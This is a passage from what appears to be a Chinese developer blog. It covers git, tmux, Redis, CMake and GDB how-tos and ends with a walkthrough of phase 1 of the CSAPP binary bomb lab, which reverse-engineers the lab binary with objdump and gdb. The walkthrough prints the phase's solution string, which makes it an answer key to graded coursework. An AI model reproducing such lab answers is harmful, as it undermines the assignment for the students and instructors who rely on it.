<h4><span id="移除文件">移除文件</span></h4><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">git rm    				#从git中移除文件，并连带从工作目录中删除指定文件</span><br><span class="line">git rm -f 				#如删除之前有修改并已放到暂存区，必须指定-f选项，防止误删还没有添加到快照的数据不能被git恢复</span><br><span class="line">git rm --cached         #把文件从git暂存区删除，但在工作目录保留该文件</span><br><span class="line">git mv &lt;file1&gt; &lt;file2&gt;  #移动文件，相当于执行以下三条命令</span><br><span class="line">					    #mv file1 file2, git rm file1, git add file2</span><br></pre></td></tr></table></figure>

<h4><span id="提交更新">提交更新</span></h4><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">git commit       		#提交更新</span><br></pre></td></tr></table></figure>

<h3><span id="4-查看信息">4. 查看信息</span></h3><h4><span id="查看当前文件状态">查看当前文件状态</span></h4><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">git status       		#检查当前文件状态</span><br></pre></td></tr></table></figure>

<h4><span id="查看提交历史">查看提交历史</span></h4><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">git log --pretty=oneline #将每个提交放在一行显示</span><br><span class="line">git log -p -2 			 #-p用来显示每次提交的内容差异, -2表示显示最近两次提交</span><br><span class="line">git log --stat 			 #查看每次提交的简略信息</span><br><span class="line">git reflog				 #显示最近的提交记录</span><br></pre></td></tr></table></figure>

<h4><span id="查看修改和差异">查看修改和差异</span></h4><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">git diff 						 #比较工作目录中当前文件和暂存区快照之间差异，即修改后未暂存的变化</span><br><span class="line">git diff --cached [file] 		 #查看暂存区与上一个commit的差异</span><br><span class="line">git diff --staged [file]		 #等同于--cached</span><br><span class="line">git diff HEAD					 #显示工作区与当前分支最新commit的差异</span><br><span class="line">git diff [commitID1] [commitID2] #比较两次提交记录的差异，比如HEAD和HEAD~1</span><br></pre></td></tr></table></figure>

<h3><span id="5-分支">5. 分支</span></h3><h4><span id="查看分支">查看分支</span></h4><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">git branch								 #列出所有本地分支</span><br><span class="line">git branch -a							 #列出所有本地分支和远程分支</span><br></pre></td></tr></table></figure>

<h4><span id="新建分支">新建分支</span></h4><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">git branch [branch_name]				 #创建新分支，但仍然停留在当前分支</span><br><span class="line">git branch [branch_name] [commitID]		 #创建新分支，并指向指定commit</span><br><span class="line">git checkout -b [branch_name] [tag_name] #在特定标签上创建一个分支</span><br></pre></td></tr></table></figure>

<h4><span id="切换分支">切换分支</span></h4><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">git checkout [branch_name] 				 #切换分支</span><br><span class="line">git checkout -b [branch_name]			 #创建并切换分支</span><br></pre></td></tr></table></figure>

<h4><span id="删除分支">删除分支</span></h4><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">git branch -d [branch_name]				 #删除分支</span><br><span class="line">git branch -D [branch_name]				 #强制删除分支</span><br></pre></td></tr></table></figure>

<h4><span id="合并分支">合并分支</span></h4><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">git merge  [branch]			   #将branch分支内容合并到当前分支</span><br><span class="line">git rebase [branch]			   #将branch分支内容变基到当前分支</span><br><span class="line">git rebase [branch1] [branch2] #将branch2分支变基到目标分支branch1，省去切换分支的步骤</span><br></pre></td></tr></table></figure>

<h5><span id="merge和rebase的区别">merge和rebase的区别</span></h5><ul>
<li>merge —— 把两个分支的最新快照及二者最近的共同祖先进行三方合并。</li>
<li>rebase —— 变基，将提交到某一个分支所有修改移到另一个分支。</li>
</ul>
<p><font color="red"><strong>注：只对从未推送至公共仓库的提交执行变基命令</strong></font>，只把变基命令用作推送前清理提交使之整洁的工具。</p>
<h3><span id="6-撤销-清理-重写">6. 撤销、清理、重写</span></h3><h4><span id="撤销操作">撤销操作</span></h4><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">git reset HEAD &lt;file&gt; 	 		#取消暂存的文件</span><br><span class="line">git checkout -- &lt;file&gt;   		#撤销文件修改，将文件还原成上次提交的状态</span><br><span class="line">git reset --hard &lt;commitID&gt;		#回退到具体版本号</span><br></pre></td></tr></table></figure>

<h4><span id="清理工作目录">清理工作目录</span></h4><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">git clean -df 				# 移除工作目录中没有忽略的未追踪文件及空的子目录, -d表示删除,-f表示强制</span><br><span class="line">git clean -dn 				# -n查看将会删除哪些文件,不会真正删除</span><br><span class="line">git clean -xdf 	   			# 指定-x额外移除已忽略的未追踪文件</span><br></pre></td></tr></table></figure>

<h4><span id="重写历史">重写历史</span></h4><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">git commit --amend  		#修改最后一次提交</span><br><span class="line">git rebase -i [commitID]    #修改多个历史提交</span><br></pre></td></tr></table></figure>

<h3><span id="7-项目共享与更新">7. 项目共享与更新</span></h3><h4><span id="远程仓库">远程仓库</span></h4><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">git remote -v 					 #查看远程仓库</span><br><span class="line">git remote add &lt;shortname&gt; &lt;url&gt; #添加新的远程git仓库</span><br><span class="line">git remote rm &lt;shortname&gt;        #移除远程仓库</span><br></pre></td></tr></table></figure>

<h4><span id="抓取-推送">抓取、推送</span></h4><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">git fetch [remote] 		 		    #拉取远程仓库数据到本地，但不会自动合并</span><br><span class="line">git pull [remote] [branch]		    #相当于git fetch和git merge命令的组合</span><br><span class="line">git push [remote] [branch]		    #推送本地分支到远程, -f强制推送</span><br><span class="line">git push [remote] –-delete [branch] #删除远程分支</span><br></pre></td></tr></table></figure>

<h3><span id="8-git设置别名">8. git设置别名</span></h3><p>通过git config为git命令创建别名后，无需每次输入完整的git命令，简化了操作</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">git config --global alias.co checkout</span><br><span class="line">git config --global alias.br branch</span><br><span class="line">git config --global alias.ci commit</span><br><span class="line">git config --global alias.st status</span><br><span class="line">git config --global alias.unstage &#x27;reset HEAD --&#x27;</span><br><span class="line">git config --global alias.last &#x27;log -1 HEAD&#x27;</span><br></pre></td></tr></table></figure>

<h3><span id="参考资料">参考资料</span></h3><p>《Pro Git》第2版： <a href="https://www.progit.cn">https://www.progit.cn</a></p>
]]></content>
      <categories>
        <category>Git</category>
      </categories>
      <tags>
        <tag>Git</tag>
      </tags>
  </entry>
  <entry>
    <title>tmux常用操作</title>
    <url>/2020/0504172127.html</url>
    <content><![CDATA[<h3><span id="简介">简介</span></h3><p>TMUX指<strong>terminal multiplexer</strong>，即终端复用软件。tmux结构包含以下三个部分：</p>
<ul>
<li><strong>session</strong>  —— 会话，可以用tmux创建多个会话。</li>
<li><strong>window</strong>  —— 窗口， 一个会话中可以包含多个窗口。</li>
<li><strong>pane</strong>       —— 窗格，用于分隔窗口，一个窗口中可以包含多个窗格。</li>
</ul>
<span id="more"></span>

<h3><span id="安装">安装</span></h3><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">apt-get install tmux</span><br></pre></td></tr></table></figure>

<h3><span id="基本操作">基本操作</span></h3><p><font color="red"><strong>说明：</strong>&lt;C-b&gt; 指 Ctrl+b键; &lt;C-b&gt; d指先按Ctrl+b键, 再按d键，不是指同时按下Ctrl+b和d</font></p>
<h4><span id="session操作">session操作</span></h4><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">tmux new -s &lt;session&gt;					#创建新会话</span><br><span class="line">tmux new -s &lt;session&gt; -d				#后台创建会话</span><br><span class="line">tmux ls									#列出所有会话</span><br><span class="line">tmux a -t &lt;session&gt;						#回到某个会话,a指attach</span><br><span class="line">tmux rename -t &lt;old_name&gt; &lt;new_name&gt;	#将指定会话改名</span><br><span class="line">tmux kill-session -t &lt;session&gt;			#关闭某个会话</span><br><span class="line">tmux kill-server						#重启所有tmux进程</span><br><span class="line">&lt;C-b&gt; d									#暂时离开tmux,回到终端,d指detach</span><br><span class="line">&lt;C-b&gt; s									#选择会话列表</span><br><span class="line">&lt;C-b&gt; $									#重命名当前会话</span><br></pre></td></tr></table></figure>

<h4><span id="window操作">window操作</span></h4><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">&lt;C-b&gt; w									#列出所有窗口</span><br><span class="line">&lt;C-b&gt; &lt;C-o&gt;								#切换窗口顺序</span><br><span class="line">&lt;C-b&gt; 0-9								#选择几号窗口</span><br><span class="line">&lt;C-b&gt; p									#切换上一个窗口, p指previous</span><br><span class="line">&lt;C-b&gt; n									#切换下一个窗口, n指next</span><br><span class="line">&lt;C-d&gt;									#退出tmux窗口, 相当于敲exit</span><br><span class="line">&lt;C-b&gt; &amp;									#退出当前窗口, 关闭所有窗格</span><br><span class="line">&lt;C-b&gt; ,									#给窗口改名</span><br></pre></td></tr></table></figure>

<h4><span id="pane操作">pane操作</span></h4><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">&lt;C-b&gt; %									#纵向分隔窗口</span><br><span class="line">&lt;C-b&gt; &quot; 								#横向分隔窗口</span><br><span class="line">&lt;C-b&gt; &lt;Up/Down/Left/Right&gt;				#方向键切换窗格，可通过配置改成HJKL</span><br><span class="line">&lt;C-b&gt; z									#最大化当前窗格</span><br><span class="line">&lt;C-b&gt; x									#关闭当前使用中的窗格</span><br><span class="line">&lt;C-b&gt; q									#显示序号,在序号消失前按对应序号可切换到对应窗格</span><br><span class="line">&lt;C-b&gt; o									#顺时针切换窗口</span><br><span class="line">&lt;C-b&gt; &lt;C-o&gt;								#逆时针切换窗口</span><br></pre></td></tr></table></figure>

<h4><span id="上下滚动查看历史">上下滚动，查看历史</span></h4><p>先按<c-b>, 再按[键，进入复制模式后，用PgUp, PgDn查看历史，再按q退出。</c-b></p>
<h3><span id="配置">配置</span></h3><p>添加~&#x2F;.tmux.conf，修改内容如下：</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_"># </span><span class="language-bash">定义快捷键&lt;C-b&gt; r, 快速加载tmux配置文件</span></span><br><span class="line">bind r source-file ~/.tmux.conf \; display &quot;tmux.conf reload!&quot;</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">适应VIM操作，上下左右改为h,j,k,l</span></span><br><span class="line">bind h select-pane -L</span><br><span class="line">bind j select-pane -D</span><br><span class="line">bind k select-pane -U</span><br><span class="line">bind l select-pane -R</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">更改横分屏，竖分屏键位</span></span><br><span class="line">bind | split-window -h</span><br><span class="line">bind - split-window -v</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">设置窗口、窗格起始序号为1</span></span><br><span class="line">set -g base-index 1</span><br><span class="line">set -g pane-base-index 1</span><br></pre></td></tr></table></figure>

<h3><span id="参考文档">参考文档</span></h3><p>TMUX常用快捷键和问题 —— <a href="https://www.cnblogs.com/piperck/p/4992159.html">https://www.cnblogs.com/piperck/p/4992159.html</a></p>
]]></content>
      <categories>
        <category>Linux</category>
      </categories>
      <tags>
        <tag>Linux</tag>
      </tags>
  </entry>
  <entry>
    <title>使用git rebase合并多条commit记录</title>
    <url>/2020/0504171429.html</url>
    <content><![CDATA[<h2><span id="操作步骤">操作步骤</span></h2><p><strong>首先用git log命令查看历史提交记录</strong>，示例git仓信息如下：</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_">$ </span><span class="language-bash">git <span class="built_in">log</span> --pretty=oneline</span></span><br><span class="line">f70c5a84996c05511d3f98034d56ca05706d62f8 (HEAD -&gt; test) fourth commit</span><br><span class="line">56a79bb29da6e483fc6de6e8f271e1a5dcba52a5 third commit</span><br><span class="line">64db6fddd02a04194b3ca22e91dd1de23f9f81d7 second commit</span><br><span class="line">783795e5285155f37c10b72ec9160e554c198ae0 first commit</span><br></pre></td></tr></table></figure>

<span id="more"></span>

<p>比如这里希望合并本地的前三条记录(f70c, 56a7, 64db)，<strong>需找到待合并记录(64db)的前一条记录的commitID(7837)，作为git rebase -i命令的参数</strong>。</p>
<p><strong>输入git rebase -i 7837, 进入历史提交的编辑界面：</strong><br><img data-src="/2020/0504171429/image1.png"></p>
<p>需要注意的是，上图显示的提交顺序与git log是相反的。<strong>将除了第一行的pick都改成squash, 保存退出(:wq)</strong>,再将commit信息改成merge three commit, 保存退出，再次使用git log查看：</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_">$ </span><span class="language-bash">git <span class="built_in">log</span> --pretty=oneline</span></span><br><span class="line">f448ac261c7e26682935201244eda0e9d93fd307 (HEAD -&gt; test) merge three commits</span><br><span class="line">783795e5285155f37c10b72ec9160e554c198ae0 first commit</span><br></pre></td></tr></table></figure>

<p>发现f70c, 56a7, 64db三条本地记录已经被成功合并为一条新记录。</p>
<h2><span id="注意事项">注意事项</span></h2><ul>
<li><p><font color="red"><strong>只对从未推送至公共仓库的提交记录执行git rebase</strong></font></p>
</li>
<li><p>原因可参考<a href="https://www.progit.cn/">https://www.progit.cn/</a>  “Git分支 -&gt; 变基的风险”，该小节详细讲述了在一个公共仓库执行变基操作的问题。</p>
</li>
</ul>
<h2><span id="参考文档">参考文档</span></h2><p><a href="https://www.progit.cn/">https://www.progit.cn/  </a></p>
]]></content>
      <categories>
        <category>Git</category>
      </categories>
      <tags>
        <tag>Git</tag>
      </tags>
  </entry>
  <entry>
    <title>64位Linux机器上使用gcc编译32位程序</title>
    <url>/2020/0531172553.html</url>
    <content><![CDATA[<h2><span id="ubuntu">Ubuntu</span></h2><p>安装以下软件包</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">apt-get install build-essential module-assistant gcc-multilib g++-multilib</span><br></pre></td></tr></table></figure>
<h2><span id="centos">Centos</span></h2><p>安装以下软件包</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">yum install glibc-devel.i686 libstdc++-devel.i686</span><br></pre></td></tr></table></figure>

<p>gcc编译添加-m32参数，如</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">gcc -m32 main.c</span><br></pre></td></tr></table></figure>
<span id="more"></span>


<h2><span id="参考链接">参考链接</span></h2><p><a href="http://notes.maxwi.com/2017/12/06/compile-x32-executable-at-x64-linux-system/">http://notes.maxwi.com/2017/12/06/compile-x32-executable-at-x64-linux-system/</a></p>
]]></content>
      <categories>
        <category>Linux</category>
      </categories>
      <tags>
        <tag>Linux</tag>
        <tag>gcc</tag>
      </tags>
  </entry>
  <entry>
    <title>如何安装和启动Redis</title>
    <url>/2020/0601173044.html</url>
    <content><![CDATA[<h2><span id="一-源码安装redis">一、源码安装redis</span></h2><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_"># </span><span class="language-bash">0.官网下载最新redis源码包</span></span><br><span class="line">wget http://download.redis.io/releases/redis-5.0.5.tar.gz</span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">1.将redis.tar.gz拷贝到/usr/local目录并解压</span></span><br><span class="line">mkdir -p /usr/local/ &amp;&amp; cd /usr/local</span><br><span class="line">cp /path/to/redis-5.0.5.tar.gz .</span><br><span class="line">tar -zxvf redis-5.0.5.tar.gz</span><br><span class="line">mv redis-5.0.5 redis &amp;&amp; cd redis</span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">2.编译、测试、安装</span></span><br><span class="line">make -j4 						# 编译</span><br><span class="line">make test						# 测试，显示All tests passed without errors</span><br><span class="line">make install					# 安装</span><br></pre></td></tr></table></figure>
<span id="more"></span>

<h2><span id="二-启动和停止redis">二、启动和停止redis</span></h2><h3><span id="通过命令行启动redis">通过命令行启动redis</span></h3><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">redis-server 								#直接启动</span><br><span class="line">redis-server --port 6380					#自定义端口号启动，--port指定端口为6380</span><br><span class="line">redis-server /usr/local/redis/redis.conf    #启动redis时指定配置文件</span><br></pre></td></tr></table></figure>
<h3><span id="通过初始化脚本启动redis">通过初始化脚本启动redis</span></h3><ul>
<li><p>在redis源码路径的utils目录中找到初始化脚本redis_init_script, 将该脚本复制到&#x2F;etc&#x2F;init.d，文件名改为redis_端口号(如redis_6379)，脚本中修改REDISPORT变量为该端口号(如6379)</p>
</li>
<li><p>建立需要的目录， 新键&#x2F;etc&#x2F;redis目录用于存放redis配置文件，新建&#x2F;var&#x2F;redis&#x2F;端口号(如&#x2F;var&#x2F;redis&#x2F;6379)目录存放redis持久化文件</p>
</li>
<li><p>修改配置文件，将redis.conf复制到&#x2F;etc&#x2F;redis下，并改名为端口号.conf(如6379.conf)，需要修改部分参数，如下表</p>
</li>
</ul>
<table>
<thead>
<tr>
<th>参数</th>
<th>值</th>
<th>说明</th>
</tr>
</thead>
<tbody><tr>
<td>daemonize</td>
<td>yes</td>
<td>以守护模式运行redis</td>
</tr>
<tr>
<td>pidfile</td>
<td>&#x2F;var&#x2F;run&#x2F;redis_端口号.pid</td>
<td>设置redis的PID文件位置</td>
</tr>
<tr>
<td>port</td>
<td>端口号</td>
<td>设置redis监听的端口号，如6379</td>
</tr>
<tr>
<td>dir</td>
<td>&#x2F;var&#x2F;redis&#x2F;端口号</td>
<td>设置持久化文件存放位置</td>
</tr>
</tbody></table>
<h3><span id="设置redis随系统自启动centos">设置redis随系统自启动(Centos)</span></h3><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">chkconfig --add redis_6379 		#增加redis服务，并通过chkconfig管理</span><br><span class="line">chkconfig redis_6379 on 		#开启服务</span><br><span class="line">chkconfig --list 				#查看redis服务级别，默认2，3，4，5为ON表示成功开启</span><br></pre></td></tr></table></figure>
<h3><span id="停止redis">停止redis</span></h3><p>强行终止redis可能导致数据丢失，正确停止redis方式是发送SHUTDOWN命令</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">redis-cli SHUTDOWN</span><br></pre></td></tr></table></figure>
<p>redis收到SHUTDOWN命令后，会先断开所有客户端连接，然后根据配置执行持久化，最后退出<br>redis可以妥善处理SIGTERM信号，所以使用kill redis进程的PID也可以正常结束redis</p>
<h2><span id="参考资料">参考资料</span></h2><p>[1]《Redis入门指南 第2版》<br>[2] redis安装教程：<a href="https://blog.csdn.net/qq_36737803/article/details/90578860">https://blog.csdn.net/qq_36737803&#x2F;article&#x2F;details&#x2F;90578860</a></p>
]]></content>
      <categories>
        <category>Redis</category>
      </categories>
      <tags>
        <tag>Redis</tag>
      </tags>
  </entry>
  <entry>
    <title>源码编译并安装CMake</title>
    <url>/2020/0726174432.html</url>
    <content><![CDATA[<p>从官网安装指定版本， 以<code>3.12.1</code>版本为例：</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">wget https://cmake.org/files/v3.12/cmake-3.12.1.tar.gz</span><br><span class="line">tar -zxvf cmake-3.12.1.tar.gz</span><br><span class="line">cd cmake-3.12.1</span><br><span class="line">./bootstrap</span><br><span class="line">make -j8</span><br><span class="line">make install</span><br></pre></td></tr></table></figure>
<span id="more"></span>

<p>查看cmake版本，检查是否安装成功</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">cmake --version</span><br></pre></td></tr></table></figure>

]]></content>
      <categories>
        <category>CMake</category>
      </categories>
      <tags>
        <tag>CMake</tag>
      </tags>
  </entry>
  <entry>
    <title>GDB加载so库符号失败的解决方法</title>
    <url>/2020/0621173409.html</url>
    <content><![CDATA[<h2><span id="问题现象">问题现象</span></h2><p>gdb调试core文件或进程时，出现加载so库符号失败，错误信息如下</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">warning: Could not load shared library symbols for ../libadd.so</span><br><span class="line">Do you need &quot;set solib-search-path&quot; or &quot;set sysroot&quot;?</span><br></pre></td></tr></table></figure>
<p>执行<strong>info sharedlibrary</strong>，查看Syms Read字段为No,  表示对应so库符号加载失败。</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_">$ </span><span class="language-bash"><span class="built_in">pwd</span> /home/gdb</span></span><br><span class="line">(gdb) info sharedlibrary</span><br><span class="line">From                To                  Syms Read   Shared Object Library</span><br><span class="line">0x00007fba2c572570  0x00007fba2c57267b  No          ../libadd.so</span><br><span class="line">0x00007fba2c370570  0x00007fba2c37066b  No          ../../var/libsub.so</span><br><span class="line">(gdb) bt</span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">0  0x00007fba2c57266b <span class="keyword">in</span> ?? ()</span></span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">1  0x00007ffc6f703ff0 <span class="keyword">in</span> ?? ()</span></span><br></pre></td></tr></table></figure>
<span id="more"></span>


<h2><span id="解决方法">解决方法</span></h2><p>设置gdb的<strong>solib-search-path</strong>选项， 指定加载失败的so的搜索路径即可。</p>
<p>solib-search-path可以指定多个路径。在linux上，路径之间用冒号分隔，命令如下:</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">(gdb) set solib-search-path /var:/home</span><br><span class="line">Reading symbols from ../libadd.so...done.</span><br><span class="line">Loaded symbols for ../libadd.so</span><br><span class="line">Reading symbols from ../../var/libsub.so...done.</span><br><span class="line">Loaded symbols for ../../var/libsub.so</span><br><span class="line">(gdb) info sharedlibrary</span><br><span class="line">From                To                  Syms Read   Shared Object Library</span><br><span class="line">0x00007fba2c572570  0x00007fba2c57267b  Yes         ../libadd.so</span><br><span class="line">0x00007fba2c370570  0x00007fba2c37066b  Yes         ../../var/libsub.so</span><br><span class="line">(gdb) bt</span><br><span class="line">#0  0x00007fba2c57266b in add (a=1, b=2) at add.c:5</span><br><span class="line">#1  0x0000000000400600 in ?? ()</span><br></pre></td></tr></table></figure>

<p>或者设置gdb的<strong>solib-absolute-prefix</strong>选项，指定被搜索so文件路径的前缀， 与solib-search-path区别在于solib-absolute-prefix只能有一个，使用如下gdb指令：</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">(gdb) set solib-absolute-prefix /</span><br><span class="line">(gdb) set sysroot /					# sysroot是solib-absolute-prefix的别名</span><br></pre></td></tr></table></figure>

<h2><span id="参考资料">参考资料</span></h2><p><a href="https://visualgdb.com/gdbreference/commands/set_solib-search-path">https://visualgdb.com/gdbreference/commands/set_solib-search-path</a></p>
]]></content>
      <categories>
        <category>GDB</category>
      </categories>
      <tags>
        <tag>GDB</tag>
      </tags>
  </entry>
  <entry>
    <title>CSAPP 二进制炸弹实验</title>
    <url>/2020/0726174022.html</url>
    <content><![CDATA[<h3><span id="实验简介">实验简介</span></h3><p>二进制炸弹是一个作为目标代码提供的程序。运行时提示用户输入6个不同的字符串，如其中一个字符串不正确，炸弹会引爆并打印一条错误信息。需要通过反汇编确定输入的6个字符串，从而拆除炸弹。</p>
<h3><span id="知识点">知识点</span></h3><ul>
<li>汇编语言基础</li>
<li>GDB和OBJDUMP工具的使用</li>
</ul>
<span id="more"></span>

<h3><span id="实验环境">实验环境</span></h3><p>Centos7 x86_64</p>
<h3><span id="获取二进制炸弹">获取二进制炸弹</span></h3><p>首先从CSAPP官网获取二进制炸弹<code>bomb.tar</code>:  <a href="http://csapp.cs.cmu.edu/3e/labs.html">http://csapp.cs.cmu.edu/3e/labs.html</a></p>
<p>在linux下执行<code>tar xvf bomb.tar</code>，得到二进制炸弹的文件，文件列表如下：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">|-- bomb		# 二进制炸弹，x86-64位</span><br><span class="line">|-- bomb.c		# 主程序，逻辑是接受用户输入的6个字符串，并判断每个字符串是否正确。如果正确，调用phase_defused进入下一关，否则调用explode_bomb引爆炸弹</span><br></pre></td></tr></table></figure>

<h3><span id="第一关">第一关</span></h3><h4><span id="1-首先理解main函数执行过程">1. 首先理解main函数执行过程</span></h4><p>反汇编炸弹，使用<code>objdump -d bomb &gt; bomb.txt</code>命令，内容如下：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">0000000000400da0 &lt;main&gt;:</span><br><span class="line">  400da0:   53                      push   %rbx</span><br><span class="line">  ......</span><br><span class="line">  400e19:   e8 84 05 00 00          callq  4013a2 &lt;initialize_bomb&gt;</span><br><span class="line">  400e1e:   bf 38 23 40 00          mov    $0x402338,%edi</span><br><span class="line">  400e23:   e8 e8 fc ff ff          callq  400b10 &lt;puts@plt&gt;</span><br><span class="line">  400e28:   bf 78 23 40 00          mov    $0x402378,%edi</span><br><span class="line">  400e2d:   e8 de fc ff ff          callq  400b10 &lt;puts@plt&gt;</span><br><span class="line">  400e32:   e8 67 06 00 00          callq  40149e &lt;read_line&gt; # 接受用户输入的字符串，保存到%rax寄存器</span><br><span class="line">  400e37:   48 89 c7                mov    %rax,%rdi		  # 用户输入的字符串保存在$rdi寄存器，并作为phase_1函数的第一个入参传递</span><br><span class="line">  400e3a:   e8 a1 00 00 00          callq  400ee0 &lt;phase_1&gt;	  # 调用phase_1(), 执行第一关代码</span><br><span class="line">  400e3f:   e8 80 07 00 00          callq  4015c4 &lt;phase_defused&gt;</span><br></pre></td></tr></table></figure>

<p>查看<code>0x400e32</code>处的代码： 主程序调用<code>read_line</code>接收用户输入的字符串，保存到<code>$rax</code>，并且将该字符串作为函数入参传递给<code>phase_1</code>，执行第一阶段的代码。</p>
<p><font color="red"><strong>这里需要理解x86-64的过程调用规则：</strong></font>（关于过程调用，可参考《CSAPP原书第三版》3.7小节 —— 过程）</p>
<ul>
<li>函数调用中，<strong>利用<code>%rax</code>寄存器保存返回值。</strong></li>
<li>关于参数传递 , <strong>如果函数参数不超过6个，会依次通过<code>%rdi</code>,<code> %rsi</code>, <code>%rdx</code>, <code>%rcx</code>, <code>%r8</code>, <code>%r9</code>传递； 如超过6个参数，超出的参数利用栈传递。</strong></li>
<li><code>%rbx, %rbp, %r12~%15</code>被划分为<strong>被调用者保存寄存器</strong>；其余的寄存器，除了栈指针<code>%rsp</code>，都被划分为<strong>调用者保存寄存器</strong>。</li>
</ul>
<h4><span id="2-理解phase_1执行过程">2. 理解phase_1执行过程</span></h4><p>查看<code>phase_1</code>的代码，如下：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">0000000000400ee0 &lt;phase_1&gt;:</span><br><span class="line">  400ee0:   48 83 ec 08             sub    $0x8,%rsp</span><br><span class="line">  400ee4:   be 00 24 40 00          mov    $0x402400,%esi 			  # $esi作为strings_not_equal函数的第二个参数传递</span><br><span class="line">  400ee9:   e8 4a 04 00 00          callq  401338 &lt;strings_not_equal&gt; # 调用strings_not_equal函数，比较用户输入的字符串($rdi)和$esi处的字符串是否相等</span><br><span class="line">  400eee:   85 c0                   test   %eax,%eax 				  # 判断%eax的值是否为0</span><br><span class="line">  400ef0:   74 05                   je     400ef7 &lt;phase_1+0x17&gt; 	  # 如%eax等于0，跳转到400ef7,正常退出</span><br><span class="line">  400ef2:   e8 43 05 00 00          callq  40143a &lt;explode_bomb&gt; 	  # 如%eax不等于0，炸弹爆炸</span><br><span class="line">  400ef7:   48 83 c4 08             add    $0x8,%rsp</span><br><span class="line">  400efb:   c3                      retq</span><br></pre></td></tr></table></figure>

<p><code>phase_1</code>执行过程如下：</p>
<ul>
<li>首先通过<code>callq</code>指令调用<code>strings_not_equal</code>函数。根据过程调用的规则，可以确定这个函数接受2个参数。第一个参数是<code>%rdi</code>, 上面分析过，是我们拆弹时输入的字符串；第二个参数是<code>$esi</code>，值为<code>0x402400</code>。顾名思义，<code>strings_not_equal</code>函数用来判断两个字符串是否相等。</li>
<li>接着用<code>test</code>指令判断函数的返回值是否为0。如果为0进行跳转并返回，调用<code>phase_defused</code>拆除炸弹，否则通过<code>callq</code>指令调用<code>explode_bomb</code>，引爆炸弹。</li>
</ul>
<p>因此，拆弹的关键在于，确认<code>0x402400</code>地址处的字符串是什么。只需要在<code>0x400ee9</code>处打个gdb断点就可以了。</p>
<h4><span id="3-gdb调试炸弹">3. gdb调试炸弹</span></h4><p>执行<code>gdb bomb</code>, 设置断点<code>b *0x400ee9</code>,  执行<code>run</code>。 此时程序会要求用户输入字符串，先随便输一个字符串使程序运行到我们设置的断点 <code>0x400ee9</code>处，如下：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"># gdb bomb</span><br><span class="line">(gdb) b *0x400ee9							# 设置断点， b相当于break</span><br><span class="line">Breakpoint 1 at 0x400ee9</span><br><span class="line">(gdb) r										# 运行程序， r相当于run</span><br><span class="line">Starting program: /home/pc/CSAPP/bomb/bomb</span><br><span class="line">Welcome to my fiendish little bomb. You have 6 phases with</span><br><span class="line">which to blow yourself up. Have a nice day!</span><br><span class="line">123											# 随便输入一个字符串，让程序运行到断点0x400ee9</span><br><span class="line">Breakpoint 1, 0x0000000000400ee9 in phase_1 ()</span><br><span class="line">(gdb) p (char *)$rdi						# $rdi保存用户输入字符串，为123，与x/s $rdi指令等价</span><br><span class="line">$2 = 0x603780 &lt;input_strings&gt; &quot;123&quot;</span><br><span class="line">(gdb) x/s $esi								# 查看esi处字符串，这就是第一关的答案</span><br><span class="line">$1 = 0x402400 &quot;Border relations with Canada have never been better.&quot;</span><br></pre></td></tr></table></figure>

<p>查看<code>%esi</code>处字符串, 即第一关的答案，如下：</p>
<p><code>Border relations with Canada have never been better.</code></p>
<p>用<code>quit</code>指令退出gdb, 新建一个文件<code>answer</code>，将答案写入该文件。重新执行<code>bomb</code>程序，指定<code>answer</code>文件名作为参数，如下：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"># ./bomb answer</span><br><span class="line">Welcome to my fiendish little bomb. You have 6 phases with</span><br><span class="line">which to blow yourself up. Have a nice day!</span><br><span class="line">Phase 1 defused. How about the next one?</span><br></pre></td></tr></table></figure>

